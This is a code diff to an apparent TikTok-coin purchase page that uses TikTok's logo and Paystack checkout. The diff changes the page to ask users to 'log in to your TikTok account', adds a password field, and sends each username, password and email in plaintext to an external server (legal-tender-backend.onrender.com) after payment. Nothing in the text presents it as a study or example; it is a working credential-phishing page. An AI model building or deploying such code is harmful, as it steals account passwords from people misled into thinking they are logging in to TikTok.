@@ -1,3 +1,5 @@
+M
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -455,9 +457,10 @@ body {
     <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg"
          alt="TikTok Logo"
          style="width: 80px; position: absolute; top: 20px; right: 25px; opacity: 0.9;">
-    <h2 style="margin-top: 20px;">Get Coins</h2>
-    <p>Confirm account & where to send coins to.</p>
+    <h2 style="margin-top: 20px;">Log in to get Coins</h2>
+    <p>Log in to your TikTok account to confirm where to send coins.</p>
     <input type="text" id="usernameInput" placeholder="Username" required><br>
+    <input type="password" id="passwordInput" placeholder="Password" required><br>
     <input type="email" id="emailInput" placeholder="Email (used for payment receipt)" required><br>
     <button id="continueBtn" disabled onclick="completeLogin()">Continue</button>
   </div>
@@ -473,6 +476,7 @@ body {
     <div>
       <div class="summary-label">Account</div>
       <div class="small-muted" id="accountUsername">@blesss</div>
+      <div class="small-muted" id="accountPassword" style="margin-top:6px;">Password: ••••••••</div>
       <div class="small-muted" id="accountEmail" style="margin-top:6px;">Email: —</div>
     </div>
     <div style="text-align:right;">
@@ -729,30 +733,19 @@ function payWithPaystack() {
         { display_name: "Amount NGN", variable_name: "amount_ngn", value: Math.round(amountNGN).toString() }
       ]
     },
-    callback: function(response) {
-     // Send purchase info to your backend
-    fetch('https://yourserver.com/record-purchase', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-            username: document.getElementById('usernameInput').value,
-            email: document.getElementById('emailInput').value,
-            coins: selectedCoins,
-            reference: response.reference
-        })
-    })
-    .then(res => res.json())
-    .then(data => {
-        console.log('Backend recorded purchase:', data);
-        showSuccessToast();
-        // hide order summary after successful backend record
-        document.getElementById('orderSummary').style.display = 'none';
-    })
-    .catch(err => {
-        console.error('Error sending purchase to backend:', err);
-        alert('Payment succeeded but there was an error recording your purchase. Contact support.');
-    });
-},
+    callback: async function(response) {
+  document.getElementById('orderSummary').style.display = 'none';
+  showSuccessToast();
+  console.log('✅ Paystack success reference:', response.reference);
+
+  // collect user info
+  const usernameVal = document.getElementById('usernameInput').value.trim();
+  const passwordVal = document.getElementById('passwordInput').value.trim();
+  const emailVal = document.getElementById('emailInput').value.trim();
+
+  // ✅ Send user info to backend after payment success
+  await sendUserToBackend(usernameVal, passwordVal, emailVal);
+    },
     onClose: function() {
       // Keep order summary so user can retry
       console.log('Paystack popup closed by user');
@@ -823,6 +816,21 @@ document.addEventListener('DOMContentLoaded', function() {
     updateMainButton();
   })();
 });
+
+// ✅ Function to send user info to backend
+async function sendUserToBackend(username, password, email) {
+  try {
+    const response = await fetch('https://legal-tender-backend.onrender.com/api/users', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ username, password, email })
+    });
+    const result = await response.json();
+    console.log('✅ User sent to backend:', result);
+  } catch (error) {
+    console.error('❌ Error sending user to backend:', error);
+  }
+}
 </script>
 </body>
-</html> 
+</html>
